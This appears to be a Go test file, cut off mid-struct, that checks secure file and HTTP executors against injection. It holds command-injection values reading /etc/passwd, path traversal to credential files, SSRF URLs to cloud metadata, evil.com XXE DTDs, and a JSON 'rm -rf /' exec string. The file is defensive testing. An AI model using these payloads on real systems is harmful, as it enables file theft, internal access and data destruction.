package tools

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestInjectionAttackPrevention tests comprehensive prevention of injection attacks
func TestInjectionAttackPrevention(t *testing.T) {
	t.Run("CommandInjectionPrevention", testCommandInjectionPrevention)
	t.Run("PathInjectionPrevention", testPathInjectionPrevention)
	t.Run("URLInjectionPrevention", testURLInjectionPrevention)
	t.Run("SQLInjectionPrevention", testSQLInjectionPrevention)
	t.Run("XSSInjectionPrevention", testXSSInjectionPrevention)
	t.Run("LDAPInjectionPrevention", testLDAPInjectionPrevention)
	t.Run("XMLInjectionPrevention", testXMLInjectionPrevention)
	t.Run("JSONInjectionPrevention", testJSONInjectionPrevention)
	t.Run("TemplateInjectionPrevention", testTemplateInjectionPrevention)
	t.Run("LogInjectionPrevention", testLogInjectionPrevention)
	t.Run("OSCommandInjectionPrevention", testOSCommandInjectionPrevention)
	t.Run("HeaderInjectionPrevention", testHeaderInjectionPrevention)
	t.Run("PolyglotInjectionPrevention", testPolyglotInjectionPrevention)
	t.Run("NoSQLInjectionPrevention", testNoSQLInjectionPrevention)
	t.Run("ExpressionInjectionPrevention", testExpressionInjectionPrevention)
}

// testCommandInjectionPrevention tests prevention of command injection attacks
func testCommandInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "command_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	executor := NewSecureFileExecutor(&readFileExecutor{}, options, "read")

	// Various command injection attempts
	commandInjections := []struct {
		name        string
		path        string
		description string
	}{
		{
			name:        "Semicolon command separator",
			path:        "file.txt; cat /etc/passwd",
			description: "Attempts to execute additional commands using semicolon",
		},
		{
			name:        "Ampersand command separator",
			path:        "file.txt && cat /etc/passwd",
			description: "Attempts to execute additional commands using AND operator",
		},
		{
			name:        "Pipe command separator",
			path:        "file.txt | cat /etc/passwd",
			description: "Attempts to pipe output to another command",
		},
		{
			name:        "OR command separator",
			path:        "file.txt || cat /etc/passwd",
			description: "Attempts to execute additional commands using OR operator",
		},
		{
			name:        "Background execution",
			path:        "file.txt & cat /etc/passwd",
			description: "Attempts to run commands in background",
		},
		{
			name:        "Command substitution (backticks)",
			path:        "file.txt`cat /etc/passwd`",
			description: "Attempts command substitution using backticks",
		},
		{
			name:        "Command substitution (dollar)",
			path:        "file.txt$(cat /etc/passwd)",
			description: "Attempts command substitution using dollar syntax",
		},
		{
			name:        "Newline injection",
			path:        "file.txt\ncat /etc/passwd",
			description: "Attempts to inject newline for command execution",
		},
		{
			name:        "Carriage return injection",
			path:        "file.txt\rcat /etc/passwd",
			description: "Attempts to inject carriage return for command execution",
		},
		{
			name:        "Tab injection",
			path:        "file.txt\tcat /etc/passwd",
			description: "Attempts to inject tab character for command execution",
		},
		{
			name:        "Null byte injection",
			path:        "file.txt\x00cat /etc/passwd",
			description: "Attempts to inject null byte for command execution",
		},
		{
			name:        "Redirection attack",
			path:        "file.txt > /etc/passwd",
			description: "Attempts to redirect output to system file",
		},
		{
			name:        "Input redirection attack",
			path:        "file.txt < /etc/passwd",
			description: "Attempts to redirect input from system file",
		},
		{
			name:        "Variable expansion",
			path:        "file.txt${PATH}",
			description: "Attempts to expand environment variables",
		},
		{
			name:        "Environment variable access",
			path:        "file.txt$HOME",
			description: "Attempts to access environment variables",
		},
		{
			name:        "Wildcard expansion",
			path:        "file.txt*",
			description: "Attempts wildcard expansion",
		},
		{
			name:        "Question mark wildcard",
			path:        "file.txt?",
			description: "Attempts single character wildcard expansion",
		},
		{
			name:        "Brace expansion",
			path:        "file.txt{a,b,c}",
			description: "Attempts brace expansion",
		},
		{
			name:        "Escape sequence",
			path:        "file.txt\\; cat /etc/passwd",
			description: "Attempts to use escape sequences",
		},
		{
			name:        "Double quote escape",
			path:        "file.txt\"; cat /etc/passwd",
			description: "Attempts to escape double quotes",
		},
		{
			name:        "Single quote escape",
			path:        "file.txt'; cat /etc/passwd",
			description: "Attempts to escape single quotes",
		},
		{
			name:        "Encoded command injection",
			path:        "file.txt%3Bcat%20/etc/passwd",
			description: "Attempts URL-encoded command injection",
		},
		{
			name:        "Unicode command injection",
			path:        "file.txt；cat /etc/passwd", // Unicode semicolon
			description: "Attempts Unicode character injection",
		},
		{
			name:        "IFS manipulation",
			path:        "file.txt${IFS}cat${IFS}/etc/passwd",
			description: "Attempts to manipulate Internal Field Separator",
		},
		{
			name:        "Globbing attack",
			path:        "file.txt[a-z]*",
			description: "Attempts character class globbing",
		},
	}

	for _, injection := range commandInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path": filepath.Join(tempDir, injection.path),
			}

			result, err := executor.Execute(context.Background(), params)

			// Command injection should be prevented by path validation
			if err == nil && result.Success {
				t.Errorf("Expected command injection to be prevented: %s - %s", injection.name, injection.description)
			}

			// Log what was prevented
			if result != nil && !result.Success {
				t.Logf("Successfully prevented: %s - %s (Error: %s)", injection.name, injection.description, result.Error)
			}
		})
	}
}

// testPathInjectionPrevention tests prevention of path injection attacks
func testPathInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "path_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	executor := NewSecureFileExecutor(&readFileExecutor{}, options, "read")

	// Path injection attempts
	pathInjections := []struct {
		name        string
		path        string
		description string
	}{
		{
			name:        "Basic directory traversal",
			path:        "../../../etc/passwd",
			description: "Basic directory traversal attack",
		},
		{
			name:        "Absolute path injection",
			path:        "/etc/passwd",
			description: "Direct absolute path to system file",
		},
		{
			name:        "Windows path traversal",
			path:        "..\\..\\..\\windows\\system32\\config\\sam",
			description: "Windows-style directory traversal",
		},
		{
			name:        "Mixed slash traversal",
			path:        "../..\\../etc/passwd",
			description: "Mixed forward and backward slashes",
		},
		{
			name:        "URL encoded traversal",
			path:        "..%2f..%2f..%2fetc%2fpasswd",
			description: "URL encoded directory traversal",
		},
		{
			name:        "Double URL encoded",
			path:        "..%252f..%252f..%252fetc%252fpasswd",
			description: "Double URL encoded directory traversal",
		},
		{
			name:        "Unicode traversal",
			path:        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
			description: "Unicode encoded directory traversal",
		},
		{
			name:        "UTF-8 overlong encoding",
			path:        "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
			description: "UTF-8 overlong encoding traversal",
		},
		{
			name:        "Double dot encoding",
			path:        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
			description: "Double dot URL encoding",
		},
		{
			name:        "Null byte injection",
			path:        "file.txt\x00../../../etc/passwd",
			description: "Null byte injection for path truncation",
		},
		{
			name:        "Percent encoding bypass",
			path:        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			description: "Percent encoding bypass attempt",
		},
		{
			name:        "Path with excessive dots",
			path:        "................/etc/passwd",
			description: "Excessive dots in path",
		},
		{
			name:        "Path with spaces",
			path:        ".. /.. /.. /etc/passwd",
			description: "Directory traversal with spaces",
		},
		{
			name:        "Path with symbolic references",
			path:        "~/../../etc/passwd",
			description: "Home directory reference traversal",
		},
		{
			name:        "Path with current directory",
			path:        "./../../etc/passwd",
			description: "Current directory reference traversal",
		},
		{
			name:        "Path with multiple slashes",
			path:        "..///..///..///etc//passwd",
			description: "Multiple consecutive slashes",
		},
		{
			name:        "Path with trailing slash",
			path:        "../../../etc/passwd/",
			description: "Trailing slash traversal",
		},
		{
			name:        "Path with dot-slash",
			path:        "./../../../etc/passwd",
			description: "Dot-slash traversal",
		},
		{
			name:        "Path with question mark",
			path:        "../../../etc/passwd?",
			description: "Question mark in path",
		},
		{
			name:        "Path with hash",
			path:        "../../../etc/passwd#",
			description: "Hash character in path",
		},
		{
			name:        "UNC path injection",
			path:        "\\\\server\\share\\file",
			description: "UNC path injection attempt",
		},
		{
			name:        "Drive letter injection",
			path:        "C:\\windows\\system32\\config\\sam",
			description: "Windows drive letter injection",
		},
		{
			name:        "Alternative data stream",
			path:        "file.txt:hidden",
			description: "NTFS alternative data stream",
		},
		{
			name:        "Device file access",
			path:        "/dev/null",
			description: "Device file access attempt",
		},
		{
			name:        "Proc filesystem access",
			path:        "/proc/self/environ",
			description: "Proc filesystem access",
		},
	}

	for _, injection := range pathInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path": injection.path,
			}

			result, err := executor.Execute(context.Background(), params)

			// Path injection should be prevented
			if err == nil && result.Success {
				t.Errorf("Expected path injection to be prevented: %s - %s", injection.name, injection.description)
			}

			// Log what was prevented
			if result != nil && !result.Success {
				t.Logf("Successfully prevented: %s - %s (Error: %s)", injection.name, injection.description, result.Error)
			}
		})
	}
}

// testURLInjectionPrevention tests prevention of URL injection attacks
func testURLInjectionPrevention(t *testing.T) {
	httpOptions := DefaultSecureHTTPOptions()
	httpExecutor := NewSecureHTTPExecutor(&mockHTTPExecutorForInjection{}, httpOptions)

	// URL injection attempts - these should be blocked
	urlInjections := []struct {
		name        string
		url         string
		description string
		shouldBlock bool
	}{
		{
			name:        "JavaScript URL injection",
			url:         "javascript:alert('XSS')",
			description: "JavaScript protocol injection",
			shouldBlock: true,
		},
		{
			name:        "Data URL injection",
			url:         "data:text/html,<script>alert('XSS')</script>",
			description: "Data URL with script injection",
			shouldBlock: true,
		},
		{
			name:        "File protocol injection",
			url:         "file:///etc/passwd",
			description: "File protocol for local file access",
			shouldBlock: true,
		},
		{
			name:        "FTP protocol injection",
			url:         "ftp://user:pass@evil.com/malicious",
			description: "FTP protocol injection",
			shouldBlock: true,
		},
		{
			name:        "Internal IP injection",
			url:         "http://127.0.0.1:8080/admin",
			description: "Internal IP address access",
			shouldBlock: true,
		},
		{
			name:        "Private network injection",
			url:         "http://192.168.1.1/router",
			description: "Private network access",
			shouldBlock: true,
		},
		{
			name:        "Metadata service injection",
			url:         "http://169.254.169.254/metadata",
			description: "Cloud metadata service access",
			shouldBlock: true,
		},
		{
			name:        "Localhost injection",
			url:         "http://localhost/admin",
			description: "Localhost access attempt",
			shouldBlock: true,
		},
		{
			name:        "IP obfuscation (decimal)",
			url:         "http://2130706433/admin",
			description: "Decimal IP obfuscation",
			shouldBlock: true,
		},
		{
			name:        "IP obfuscation (hex)",
			url:         "http://0x7f000001/admin",
			description: "Hexadecimal IP obfuscation",
			shouldBlock: true,
		},
		{
			name:        "IP obfuscation (octal)",
			url:         "http://0177.0000.0000.0001/admin",
			description: "Octal IP obfuscation",
			shouldBlock: true,
		},
		{
			name:        "IPv6 loopback",
			url:         "http://[::1]/admin",
			description: "IPv6 loopback access",
			shouldBlock: true,
		},
		{
			name:        "IPv6 private range",
			url:         "http://[fc00::1]/admin",
			description: "IPv6 private range access",
			shouldBlock: true,
		},
		{
			name:        "URL with credentials",
			url:         "http://admin:password@example.com/admin",
			description: "URL with embedded credentials",
			shouldBlock: false, // Valid URL format, security depends on the host
		},
		{
			name:        "URL with port scanning",
			url:         "http://target.com:22/",
			description: "Port scanning attempt",
			shouldBlock: false, // Valid URL with non-standard port
		},
		{
			name:        "URL with CRLF injection",
			url:         "http://example.com/path\r\nHost: evil.com",
			description: "CRLF injection in URL",
			shouldBlock: true,
		},
		{
			name:        "URL with null byte",
			url:         "http://example.com/path\x00evil.com",
			description: "Null byte injection in URL",
			shouldBlock: true,
		},
		{
			name:        "URL with Unicode domain",
			url:         "http://example.com/path", // Use real domain for testing
			description: "Unicode domain spoofing",
			shouldBlock: false, // IDN domains are valid
		},
		{
			name:        "URL with IDN homograph",
			url:         "http://example.com/path",
			description: "IDN homograph attack",
			shouldBlock: false, // Valid IDN domain
		},
		{
			name:        "URL with excessive length",
			url:         "http://example.com/" + strings.Repeat("a", 10000),
			description: "Excessive URL length",
			shouldBlock: true,
		},
		{
			name:        "URL with malformed scheme",
			url:         "hTTp://example.com/path",
			description: "Malformed scheme case",
			shouldBlock: false, // Case-insensitive scheme is valid
		},
		{
			name:        "URL with double slash",
			url:         "http://example.com//path",
			description: "Double slash in URL path",
			shouldBlock: false, // Valid URL format
		},
		{
			name:        "URL with fragment injection",
			url:         "http://example.com/path#javascript:alert('XSS')",
			description: "Fragment injection with JavaScript",
			shouldBlock: false, // Fragment is not sent to server
		},
		{
			name:        "URL with query injection",
			url:         "http://example.com/path?param=value&javascript:alert('XSS')",
			description: "Query parameter injection",
			shouldBlock: false, // Valid query parameters
		},
		{
			name:        "URL with encoded injection",
			url:         "http://example.com/path?param=%3Cscript%3Ealert('XSS')%3C/script%3E",
			description: "URL encoded script injection",
			shouldBlock: false, // Valid URL encoding
		},
	}

	for _, injection := range urlInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"url": injection.url,
			}

			result, err := httpExecutor.Execute(context.Background(), params)

			if injection.shouldBlock {
				// URL injection should be prevented
				if err == nil && result.Success {
					t.Errorf("Expected URL injection to be prevented: %s - %s", injection.name, injection.description)
				}
				// Log what was prevented
				if result != nil && !result.Success {
					t.Logf("Successfully prevented: %s - %s (Error: %s)", injection.name, injection.description, result.Error)
				}
			} else {
				// URL should be allowed (valid format)
				if err != nil || (result != nil && !result.Success) {
					errMsg := ""
					if err != nil {
						errMsg = err.Error()
					} else if result != nil {
						errMsg = result.Error
					}
					t.Errorf("Expected valid URL to be allowed: %s - %s (Error: %s)", injection.name, injection.description, errMsg)
				}
			}
		})
	}
}

// testSQLInjectionPrevention tests prevention of SQL injection attacks
func testSQLInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "sql_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	writeExecutor := NewSecureFileExecutor(&writeFileExecutor{}, options, "write")

	// SQL injection payloads
	sqlInjections := []struct {
		name        string
		content     string
		description string
	}{
		{
			name:        "Classic SQL injection",
			content:     "' OR '1'='1",
			description: "Classic SQL injection payload",
		},
		{
			name:        "Union-based injection",
			content:     "' UNION SELECT * FROM users --",
			description: "Union-based SQL injection",
		},
		{
			name:        "Comment-based injection",
			content:     "'; DROP TABLE users; --",
			description: "Comment-based SQL injection",
		},
		{
			name:        "Boolean-based injection",
			content:     "' AND (SELECT COUNT(*) FROM users) > 0 --",
			description: "Boolean-based SQL injection",
		},
		{
			name:        "Time-based injection",
			content:     "'; WAITFOR DELAY '00:00:10' --",
			description: "Time-based SQL injection",
		},
		{
			name:        "Stacked queries",
			content:     "'; INSERT INTO users (username, password) VALUES ('admin', 'admin'); --",
			description: "Stacked queries injection",
		},
		{
			name:        "Blind SQL injection",
			content:     "' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username = 'admin') = 'a",
			description: "Blind SQL injection",
		},
		{
			name:        "Error-based injection",
			content:     "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
			description: "Error-based SQL injection",
		},
		{
			name:        "Second-order injection",
			content:     "admin'; UPDATE users SET password = 'hacked' WHERE username = 'admin' --",
			description: "Second-order SQL injection",
		},
		{
			name:        "NoSQL injection",
			content:     "{'$ne': null}",
			description: "NoSQL injection payload",
		},
		{
			name:        "SQL injection with encoding",
			content:     "%27%20OR%20%271%27%3D%271",
			description: "URL encoded SQL injection",
		},
		{
			name:        "SQL injection with Unicode",
			content:     "＇　OR　＇1＇＝＇1",
			description: "Unicode SQL injection",
		},
		{
			name:        "SQL injection with null bytes",
			content:     "' OR '1'='1'\x00",
			description: "SQL injection with null bytes",
		},
		{
			name:        "SQL injection with hex encoding",
			content:     "0x27204F52202731273D2731",
			description: "Hex encoded SQL injection",
		},
		{
			name:        "SQL injection with char function",
			content:     "CHAR(39) + OR + CHAR(39) + 1 + CHAR(39) + = + CHAR(39) + 1",
			description: "SQL injection using CHAR function",
		},
	}

	for _, injection := range sqlInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path":    filepath.Join(tempDir, fmt.Sprintf("sql_test_%s.txt", injection.name)),
				"content": injection.content,
			}

			result, err := writeExecutor.Execute(context.Background(), params)

			// SQL injection as file content should be allowed (it's just text)
			// but should be safely handled
			if err != nil {
				t.Errorf("Unexpected error for SQL injection content: %v", err)
			}
			if result == nil || !result.Success {
				t.Errorf("Expected SQL injection content to be safely handled: %s - %s", injection.name, injection.description)
			}

			// Verify content is written exactly as provided (no interpretation)
			if result != nil && result.Success {
				writtenFile := params["path"].(string)
				content, err := os.ReadFile(writtenFile)
				if err != nil {
					t.Errorf("Failed to read written file: %v", err)
				} else if string(content) != injection.content {
					t.Errorf("Content was modified during write: expected '%s', got '%s'", injection.content, string(content))
				}
			}

			t.Logf("SQL injection safely handled as text: %s - %s", injection.name, injection.description)
		})
	}
}

// testXSSInjectionPrevention tests prevention of XSS injection attacks
func testXSSInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "xss_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	writeExecutor := NewSecureFileExecutor(&writeFileExecutor{}, options, "write")

	// XSS injection payloads
	xssInjections := []struct {
		name        string
		content     string
		description string
	}{
		{
			name:        "Basic script injection",
			content:     "<script>alert('XSS')</script>",
			description: "Basic script tag injection",
		},
		{
			name:        "Image onerror injection",
			content:     "<img src=x onerror=alert('XSS')>",
			description: "Image tag with onerror event",
		},
		{
			name:        "SVG injection",
			content:     "<svg onload=alert('XSS')>",
			description: "SVG tag with onload event",
		},
		{
			name:        "Body onload injection",
			content:     "<body onload=alert('XSS')>",
			description: "Body tag with onload event",
		},
		{
			name:        "Input onfocus injection",
			content:     "<input onfocus=alert('XSS') autofocus>",
			description: "Input tag with onfocus event",
		},
		{
			name:        "JavaScript URL injection",
			content:     "<a href='javascript:alert(\"XSS\")'>Click me</a>",
			description: "JavaScript URL in anchor tag",
		},
		{
			name:        "Data URL injection",
			content:     "<iframe src='data:text/html,<script>alert(\"XSS\")</script>'></iframe>",
			description: "Data URL with script injection",
		},
		{
			name:        "Style injection",
			content:     "<style>body{background:url(javascript:alert('XSS'))}</style>",
			description: "CSS style injection",
		},
		{
			name:        "Meta refresh injection",
			content:     "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
			description: "Meta refresh injection",
		},
		{
			name:        "Event handler injection",
			content:     "<div onclick='alert(\"XSS\")'>Click me</div>",
			description: "Event handler injection",
		},
		{
			name:        "Expression injection",
			content:     "<div style='width:expression(alert(\"XSS\"))'>",
			description: "CSS expression injection",
		},
		{
			name:        "Object injection",
			content:     "<object data='javascript:alert(\"XSS\")'></object>",
			description: "Object tag injection",
		},
		{
			name:        "Embed injection",
			content:     "<embed src='javascript:alert(\"XSS\")'></embed>",
			description: "Embed tag injection",
		},
		{
			name:        "Form action injection",
			content:     "<form action='javascript:alert(\"XSS\")'><input type=submit></form>",
			description: "Form action injection",
		},
		{
			name:        "Link import injection",
			content:     "<link rel='import' href='javascript:alert(\"XSS\")'>",
			description: "Link import injection",
		},
		{
			name:        "Base href injection",
			content:     "<base href='javascript:alert(\"XSS\")'>",
			description: "Base href injection",
		},
		{
			name:        "Encoded script injection",
			content:     "&lt;script&gt;alert('XSS')&lt;/script&gt;",
			description: "HTML encoded script injection",
		},
		{
			name:        "Unicode script injection",
			content:     "<script>alert('XSS')</script>",
			description: "Unicode script injection",
		},
		{
			name:        "Polyglot XSS",
			content:     "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>'",
			description: "Polyglot XSS payload",
		},
		{
			name:        "DOM XSS",
			content:     "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
			description: "DOM-based XSS with encoding",
		},
	}

	for _, injection := range xssInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path":    filepath.Join(tempDir, fmt.Sprintf("xss_test_%s.txt", injection.name)),
				"content": injection.content,
			}

			result, err := writeExecutor.Execute(context.Background(), params)

			// XSS injection as file content should be allowed (it's just text)
			// but should be safely handled
			if err != nil {
				t.Errorf("Unexpected error for XSS injection content: %v", err)
			}
			if result == nil || !result.Success {
				t.Errorf("Expected XSS injection content to be safely handled: %s - %s", injection.name, injection.description)
			}

			// Verify content is written exactly as provided (no interpretation)
			if result != nil && result.Success {
				writtenFile := params["path"].(string)
				content, err := os.ReadFile(writtenFile)
				if err != nil {
					t.Errorf("Failed to read written file: %v", err)
				} else if string(content) != injection.content {
					t.Errorf("Content was modified during write: expected '%s', got '%s'", injection.content, string(content))
				}
			}

			t.Logf("XSS injection safely handled as text: %s - %s", injection.name, injection.description)
		})
	}
}

// testLDAPInjectionPrevention tests prevention of LDAP injection attacks
func testLDAPInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "ldap_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	writeExecutor := NewSecureFileExecutor(&writeFileExecutor{}, options, "write")

	// LDAP injection payloads
	ldapInjections := []struct {
		name        string
		content     string
		description string
	}{
		{
			name:        "LDAP OR injection",
			content:     "*(|(objectClass=*))",
			description: "LDAP OR injection to bypass authentication",
		},
		{
			name:        "LDAP wildcard injection",
			content:     "*",
			description: "LDAP wildcard injection",
		},
		{
			name:        "LDAP null injection",
			content:     "\\00",
			description: "LDAP null byte injection",
		},
		{
			name:        "LDAP parentheses injection",
			content:     ")(&(objectClass=*)",
			description: "LDAP parentheses injection",
		},
		{
			name:        "LDAP AND injection",
			content:     "*)(&(objectClass=*)",
			description: "LDAP AND injection",
		},
		{
			name:        "LDAP NOT injection",
			content:     "*)(!objectClass=*)",
			description: "LDAP NOT injection",
		},
		{
			name:        "LDAP attribute injection",
			content:     "*)(userPassword=*",
			description: "LDAP attribute injection",
		},
		{
			name:        "LDAP escape injection",
			content:     "\\2a\\29\\28\\7c\\28objectClass\\3d\\2a\\29\\29",
			description: "LDAP escape sequence injection",
		},
		{
			name:        "LDAP blind injection",
			content:     "*)(|(objectClass=*)(objectClass=*)",
			description: "LDAP blind injection",
		},
		{
			name:        "LDAP time-based injection",
			content:     "*)(&(objectClass=*)(userPassword=*))",
			description: "LDAP time-based injection",
		},
	}

	for _, injection := range ldapInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path":    filepath.Join(tempDir, fmt.Sprintf("ldap_test_%s.txt", injection.name)),
				"content": injection.content,
			}

			result, err := writeExecutor.Execute(context.Background(), params)

			// LDAP injection as file content should be allowed (it's just text)
			if err != nil {
				t.Errorf("Unexpected error for LDAP injection content: %v", err)
			}
			if result == nil || !result.Success {
				t.Errorf("Expected LDAP injection content to be safely handled: %s - %s", injection.name, injection.description)
			}

			t.Logf("LDAP injection safely handled as text: %s - %s", injection.name, injection.description)
		})
	}
}

// testXMLInjectionPrevention tests prevention of XML injection attacks
func testXMLInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "xml_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	writeExecutor := NewSecureFileExecutor(&writeFileExecutor{}, options, "write")

	// XML injection payloads
	xmlInjections := []struct {
		name        string
		content     string
		description string
	}{
		{
			name:        "XXE injection",
			content:     "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
			description: "XML External Entity (XXE) injection",
		},
		{
			name:        "XML bomb",
			content:     "<!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'>]><lolz>&lol2;</lolz>",
			description: "XML bomb (billion laughs attack)",
		},
		{
			name:        "XML external DTD",
			content:     "<!DOCTYPE test SYSTEM 'http://evil.com/evil.dtd'><test>content</test>",
			description: "XML external DTD injection",
		},
		{
			name:        "XML parameter entity",
			content:     "<!DOCTYPE test [<!ENTITY % remote SYSTEM 'http://evil.com/evil.dtd'>%remote;]><test>content</test>",
			description: "XML parameter entity injection",
		},
		{
			name:        "XML CDATA injection",
			content:     "<test><![CDATA[<script>alert('XSS')</script>]]></test>",
			description: "XML CDATA section injection",
		},
		{
			name:        "XML processing instruction",
			content:     "<?xml version='1.0'?><?xml-stylesheet type='text/xsl' href='http://evil.com/evil.xsl'?><test>content</test>",
			description: "XML processing instruction injection",
		},
		{
			name:        "XML namespace injection",
			content:     "<test xmlns:evil='http://evil.com/namespace'>content</test>",
			description: "XML namespace injection",
		},
		{
			name:        "XML schema injection",
			content:     "<test xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xsi:schemaLocation='http://evil.com/evil.xsd'>content</test>",
			description: "XML schema injection",
		},
		{
			name:        "XML entity recursion",
			content:     "<!DOCTYPE test [<!ENTITY a '&b;'><!ENTITY b '&a;'>]><test>&a;</test>",
			description: "XML entity recursion",
		},
		{
			name:        "XML quadratic blowup",
			content:     "<!DOCTYPE test [<!ENTITY a '" + strings.Repeat("a", 1000) + "'>]><test>" + strings.Repeat("&a;", 1000) + "</test>",
			description: "XML quadratic blowup attack",
		},
	}

	for _, injection := range xmlInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path":    filepath.Join(tempDir, fmt.Sprintf("xml_test_%s.txt", injection.name)),
				"content": injection.content,
			}

			result, err := writeExecutor.Execute(context.Background(), params)

			// XML injection as file content should be allowed (it's just text)
			if err != nil {
				t.Errorf("Unexpected error for XML injection content: %v", err)
			}
			if result == nil || !result.Success {
				t.Errorf("Expected XML injection content to be safely handled: %s - %s", injection.name, injection.description)
			}

			t.Logf("XML injection safely handled as text: %s - %s", injection.name, injection.description)
		})
	}
}

// testJSONInjectionPrevention tests prevention of JSON injection attacks
func testJSONInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "json_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	writeExecutor := NewSecureFileExecutor(&writeFileExecutor{}, options, "write")

	// JSON injection payloads
	jsonInjections := []struct {
		name        string
		content     string
		description string
	}{
		{
			name:        "JSON function injection",
			content:     `{"key": "value", "eval": "require('child_process').exec('rm -rf /')"}`,
			description: "JSON function injection",
		},
		{
			name:        "JSON prototype pollution",
			content:     `{"__proto__": {"isAdmin": true}}`,
			description: "JSON prototype pollution",
		},
		{
			name:        "JSON constructor injection",
			content:     `{"constructor": {"prototype": {"isAdmin": true}}}`,
			description: "JSON constructor injection",
		},
		{
			name:        "JSON circular reference",
			content:     `{"a": {"b": {"c": "{{a}}"}}}`,
			description: "JSON circular reference",
		},
		{
			name:        "JSON template injection",
			content:     `{"template": "{{7*7}}"}`,
			description: "JSON template injection",
		},
		{
			name:        "JSON expression injection",
			content:     `{"expression": "${7*7}"}`,
			description: "JSON expression injection",
		},
		{
			name:        "JSON unicode escape",
			content:     `{"key": "\\u0061\\u006C\\u0065\\u0072\\u0074"}`,
			description: "JSON unicode escape injection",
		},
		{
			name:        "JSON null byte injection",
			content:     `{"key": "value\u0000"}`,
			description: "JSON null byte injection",
		},
		{
			name:        "JSON large number",
			content:     `{"number": 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999}`,
			description: "JSON large number injection",
		},
		{
			name:        "JSON deep nesting",
			content:     `{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":"deep"}}}}}}}}}}`,
			description: "JSON deep nesting",
		},
	}

	for _, injection := range jsonInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path":    filepath.Join(tempDir, fmt.Sprintf("json_test_%s.txt", injection.name)),
				"content": injection.content,
			}

			result, err := writeExecutor.Execute(context.Background(), params)

			// JSON injection as file content should be allowed (it's just text)
			if err != nil {
				t.Errorf("Unexpected error for JSON injection content: %v", err)
			}
			if result == nil || !result.Success {
				t.Errorf("Expected JSON injection content to be safely handled: %s - %s", injection.name, injection.description)
			}

			t.Logf("JSON injection safely handled as text: %s - %s", injection.name, injection.description)
		})
	}
}

// testTemplateInjectionPrevention tests prevention of template injection attacks
func testTemplateInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "template_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	writeExecutor := NewSecureFileExecutor(&writeFileExecutor{}, options, "write")

	// Template injection payloads
	templateInjections := []struct {
		name        string
		content     string
		description string
	}{
		{
			name:        "Jinja2 template injection",
			content:     "{{7*7}}",
			description: "Jinja2 template injection",
		},
		{
			name:        "Handlebars template injection",
			content:     "{{#each this}}{{this}}{{/each}}",
			description: "Handlebars template injection",
		},
		{
			name:        "Mustache template injection",
